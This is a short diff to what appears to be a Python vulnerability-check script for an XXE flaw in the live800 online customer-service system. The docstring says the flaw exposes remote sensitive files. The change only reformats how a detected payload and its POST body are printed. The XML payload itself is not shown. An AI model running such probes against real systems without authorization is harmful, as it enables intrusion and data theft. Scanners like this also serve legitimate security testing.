@@ -7,6 +7,7 @@ author: Lucifer
 description: live800使用了xfire实现webservice,xfire存在一个XXE，可以直接利用获取远程敏感文件信息。
 '''
 import sys
+import json
 import requests
 import warnings
 from termcolor import cprint
@@ -46,7 +47,7 @@ class live800_services_xxe_BaseVerify():
             try:
                 req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                    cprint("[+]存在live800在线客服系统XML实体注入漏洞...(高危)\tpayload: "+vulnurl+"\t\tpost: "+post_data, "red")
+                    cprint("[+]存在live800在线客服系统XML实体注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
 
             except:
                 cprint("[-] "+__file__+"====>连接超时", "cyan")
